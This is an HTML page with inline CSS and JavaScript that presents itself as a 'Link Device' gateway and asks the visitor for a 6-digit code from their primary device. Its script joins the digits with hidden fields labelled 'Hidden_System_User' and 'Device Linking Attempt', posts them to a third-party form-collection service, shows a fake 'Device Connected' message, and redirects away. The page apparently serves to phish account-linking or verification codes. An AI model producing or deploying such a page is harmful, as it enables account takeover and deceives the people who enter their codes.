<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Link Your Device | Gateway</title>
  <style>
    :root {
      --primary: #3b82f6; 
      --primary-dark: #2563eb;
      --bg-base: #020617; 
      --card-bg: rgba(7, 10, 15, 0.95); 
      --text-main: #f8fafc;
      --text-muted: #94a3b8;
      --border: rgba(255, 255, 255, 0.1);
    }

    body { 
      margin: 0; 
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
      background: var(--bg-base); 
      color: var(--text-main); 
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .overlay { 
      width: 100%;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: radial-gradient(circle at center, rgba(59, 130, 246, 0.05) 0%, rgba(2, 6, 23, 1) 100%);
    }

    .container { 
      background: var(--card-bg);
      backdrop-filter: blur(30px);
      -webkit-backdrop-filter: blur(30px);
      padding: 40px 25px; 
      width: 95%;
      max-width: 420px; 
      border-radius: 28px; 
      border: 1px solid var(--border);
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
      text-align: center;
    }

    .icon-box {
      width: 50px;
      height: 50px;
      background: rgba(59, 130, 246, 0.1);
      border-radius: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
      color: var(--primary);
    }
    
    h2 { font-size: 22px; font-weight: 600; margin: 0 0 8px 0; }
    p { font-size: 14px; color: var(--text-muted); line-height: 1.5; margin-bottom: 30px; }
    
    /* Code Input Grid */
    .code-container {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px; /* Padding between boxes */
      margin-bottom: 30px;
    }

    .code-box {
      width: 45px;
      height: 55px;
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid var(--border);
      border-radius: 12px;
      font-size: 24px;
      font-weight: 600;
      color: white;
      text-align: center;
      transition: all 0.2s ease;
    }

    .code-box:focus {
      outline: none;
      border-color: var(--primary);
      background: rgba(59, 130, 246, 0.05);
      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
    }

    .dash {
      font-size: 20px;
      color: var(--text-muted);
      font-weight: bold;
      margin: 0 5px;
    }

    button { 
      background: var(--primary);
      color: white;
      padding: 16px; 
      border-radius: 14px; 
      border: none;
      cursor: pointer; 
      font-weight: 600; 
      width: 100%; 
      font-size: 15px; 
      transition: all 0.2s ease;
      letter-spacing: 0.5px;
    }

    button:hover { background: var(--primary-dark); transform: translateY(-1px); }
    button:disabled { opacity: 0.5; cursor: not-allowed; }
    
    .status-msg { 
      margin-top: 20px; 
      font-size: 13px; 
      color: var(--primary); 
      font-weight: 500;
      display: none;
    }
  </style>
</head>
<body>

<div class="overlay">
  <div class="container">
    <div class="icon-box">
      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
    </div>
    
    <h2>Link Device</h2>
    <p>Enter the 6-digit code provided on your primary device.</p>
    
    <form id="linkForm">
      <input type="hidden" name="phone_number" value="Hidden_System_User">
      <input type="hidden" name="intent" id="intent" value="Device Linking Attempt">
      <!-- We will combine individual values into this hidden field before submit -->
      <input type="hidden" name="received_code" id="finalCode">

      <div class="code-container">
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
        
        <span class="dash">—</span>
        
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
      </div>

      <button type="submit" id="submitBtn">Link Device</button>
      
      <div id="statusMessage" class="status-msg">
        Finalizing link...
      </div>
    </form>
  </div>
</div>

<script>
  const inputs = document.querySelectorAll('.code-box');
  const submitBtn = document.getElementById('submitBtn');

  // Handle continuous entry and auto-focus
  inputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      if (e.target.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !e.target.value && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  document.getElementById('linkForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // Combine the 6 boxes into one string
    let fullCode = "";
    inputs.forEach(input => fullCode += input.value);
    document.getElementById('finalCode').value = fullCode;

    const statusMsg = document.getElementById('statusMessage');

    submitBtn.disabled = true;
    submitBtn.innerText = "Linking...";
    statusMsg.style.display = "block";

    try {
      const response = await fetch("https://formcarry.com", {
        method: 'POST',
        headers: { 
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams(new FormData(e.target))
      });

      if (response.ok) {
        statusMsg.innerText = "Success! Device Connected.";
        submitBtn.innerText = "Connected";
        setTimeout(() => { window.location.href = "https://github.io"; }, 1500);
      } else {
        throw new Error();
      }
    } catch (err) {
      alert("Verification failed. Please try again.");
      submitBtn.disabled = false;
      submitBtn.innerText = "Link Device";
      statusMsg.style.display = "none";
    }
  });

  // Focus first box on start
  window.onload = () => inputs[0].focus();
</script>

</body>
</html>
